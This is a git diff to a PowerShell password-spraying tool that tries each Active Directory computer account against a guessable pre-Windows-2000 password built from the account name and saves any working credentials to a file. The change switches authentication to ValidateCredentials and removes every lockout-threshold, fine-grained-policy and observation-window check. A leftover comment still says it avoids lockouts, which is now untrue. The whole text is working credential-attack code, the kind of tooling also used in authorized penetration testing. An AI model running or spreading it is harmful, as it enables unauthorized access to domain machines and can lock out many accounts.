@@ -98,7 +98,7 @@ function Invoke-Pre2kSpray
     Write-Host -ForegroundColor Yellow "[*] Password spraying has beguns"
     Write-Host "[*] This might take a while depending on the total number of computers"
 
-    Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $ComputerListArray -OutFile $OutFile
+    Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $ComputerListArray -OutFile $OutFile -DomainFQDN $Domain
 
     Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
     if ($OutFile -ne "")
@@ -163,60 +163,14 @@ function Get-DomainComputerList
         Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."
         break
     }
-
-    # Setting the current domain's account lockout threshold
+    
     $objDeDomain = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
-    $AccountLockoutThresholds = @()
-    $AccountLockoutThresholds += $objDeDomain.Properties.lockoutthreshold
-
-    # Getting the AD behavior version to determine if fine-grained password policies are possible
-    $behaviorversion = [int] $objDeDomain.Properties['msds-behavior-version'].item(0)
-    if ($behaviorversion -ge 3)
-    {
-        # Determine if there are any fine-grained password policies
-        Write-Host "[*] Current domain is compatible with Fine-Grained Password Policy."
-        $ADSearcher = New-Object System.DirectoryServices.DirectorySearcher
-        $ADSearcher.SearchRoot = $objDeDomain
-        $ADSearcher.Filter = "(objectclass=msDS-PasswordSettings)"
-        $PSOs = $ADSearcher.FindAll()
-
-        if ( $PSOs.count -gt 0)
-        {
-            Write-Host -foregroundcolor "yellow" ("[*] A total of " + $PSOs.count + " Fine-Grained Password policies were found.`r`n")
-            foreach($entry in $PSOs)
-            {
-                # Selecting the lockout threshold, min pwd length, and which
-                # groups the fine-grained password policy applies to
-                $PSOFineGrainedPolicy = $entry | Select-Object -ExpandProperty Properties
-                $PSOPolicyName = $PSOFineGrainedPolicy.name
-                $PSOLockoutThreshold = $PSOFineGrainedPolicy.'msds-lockoutthreshold'
-                $PSOAppliesTo = $PSOFineGrainedPolicy.'msds-psoappliesto'
-                $PSOMinPwdLength = $PSOFineGrainedPolicy.'msds-minimumpasswordlength'
-                # adding lockout threshold to array for use later to determine which is the lowest.
-                $AccountLockoutThresholds += $PSOLockoutThreshold
-
-                Write-Host "[*] Fine-Grained Password Policy titled: $PSOPolicyName has a Lockout Threshold of $PSOLockoutThreshold attempts, minimum password length of $PSOMinPwdLength chars, and applies to $PSOAppliesTo.`r`n"
-            }
-        }
-    }
-
-    $observation_window = Get-ObservationWindow $objDeDomain
 
     # Generate a computer list from the domain
     # Selecting the lowest account lockout threshold in the domain to avoid
     # locking out any accounts.
-    [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
     Write-Host -ForegroundColor "yellow" "[*] Now creating a list of computers to spray..."
     
-    if ($SmallestLockoutThreshold -eq "0")
-    {
-        Write-Host -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
-    }
-    else
-    {
-        Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SmallestLockoutThreshold login attempts."
-    }
-
     $ComputerSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
     $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
     $ComputerSearcher.SearchRoot = $DirEntry
@@ -225,7 +179,7 @@ function Get-DomainComputerList
     $ComputerSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
     $ComputerSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null
 
-    $ComputerSearcher.filter = "(&(objectClass=computer)$Filter)"
+    $ComputerSearcher.filter = "(&(objectClass=computer))"
 
     $ComputerSearcher.PropertiesToLoad.add("samaccountname") > $Null
     $ComputerSearcher.PropertiesToLoad.add("lockouttime") > $Null
@@ -237,50 +191,12 @@ function Get-DomainComputerList
     # grab batches of 1000 in results
     $ComputerSearcher.PageSize = 1000
     $AllComputerObjects = $ComputerSearcher.FindAll()
-    Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllComputerObjects.count + " total computers found.")
     $ComputerListArray = @()
 
-    if ($RemovePotentialLockouts)
+    foreach ($user in $AllComputerObjects)
     {
-        Write-Host -ForegroundColor "yellow" "[*] Removing computers within 1 attempt of locking out from list."
-        foreach ($user in $AllComputerObjects)
-        {
-            # Getting bad password counts and lst bad password time for each user
-            $badcount = $user.Properties.badpwdcount
-            $samaccountname = $user.Properties.samaccountname
-            try
-            {
-                $badpasswordtime = $user.Properties.badpasswordtime[0]
-            }
-            catch
-            {
-                continue
-            }
-            $currenttime = Get-Date
-            $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
-            $timedifference = ($currenttime - $lastbadpwd).TotalMinutes
-
-            if ($badcount)
-            {
-                [int]$userbadcount = [convert]::ToInt32($badcount, 10)
-                $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount
-                # if there is more than 1 attempt left before a user locks out
-                # or if the time since the last failed login is greater than the domain
-                # observation window add user to spray list
-                if (($timedifference -gt $observation_window) -or ($attemptsuntillockout -gt 1))
-                                {
-                    $ComputerListArray += $samaccountname
-                }
-            }
-        }
-    }
-    else
-    {
-        foreach ($user in $AllComputerObjects)
-        {
-            $samaccountname = $user.Properties.samaccountname
-            $ComputerListArray += $samaccountname
-        }
+        $samaccountname = $user.Properties.samaccountname
+        $ComputerListArray += $samaccountname
     }
 
     Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + $ComputerListArray.count + " computers gathered from the current user's domain")
@@ -295,9 +211,12 @@ function Invoke-SpraySinglePassword
             [Parameter(Position=2)]
             [string[]]
             $UserListArray,
+            [Parameter(Position=3)]
+            [string]
+            $OutFile,
             [Parameter(Position=4)]
             [string]
-            $OutFile
+            $DomainFQDN
     )
     $time = Get-Date
     $count = $UserListArray.count
@@ -309,33 +228,34 @@ function Invoke-SpraySinglePassword
     }
     $RandNo = New-Object System.Random
 
+    # import assembly needed for krb auth
+    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+
     foreach ($Computer in $UserListArray)
     {
+        # Truncate if longer than 14 chars
         $Password = "$Computer".ToLower().Substring(0,"$Computer".Length - 1)
-        if ("$Password".Length > 20)
+        if ("$Password".Length > 14)
         {
-            $Password = $Password.Substring(0,20)
+            $Password = $Password.Substring(0,14)
         }
-        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$Computer,$Password)
-        if ($Domain_check.name -ne $null)
-        {
+
+        # Try authenticating
+        $Context = "Domain"
+        $Authtype = "Sealing"
+        $conn = new-object system.directoryservices.accountmanagement.principalcontext($Context, $DomainFQDN, $Authtype)
+
+        # Authenticate using the provided credentials
+        if ($conn.ValidateCredentials($Computer, $Password)) {
             if ($OutFile -ne "")
             {
                 Add-Content $OutFile $Computer`:$Password
             }
             Write-Host -ForegroundColor Green "[*] SUCCESS! Computer:$Computer Password:$Password"
-        }
+        } 
+        
         $curr_user += 1
         Write-Host -nonewline "$curr_user of $count computers tested`r"
     }
 
-}
-
-function Get-ObservationWindow($DomainEntry)
-{
-    # Get account lockout observation window to avoid running more than 1
-    # password spray per observation window.
-    $lockObservationWindow_attr = $DomainEntry.Properties['lockoutObservationWindow']
-    $observation_window = $DomainEntry.ConvertLargeIntegerToInt64($lockObservationWindow_attr.Value) / -600000000
-    return $observation_window
 }
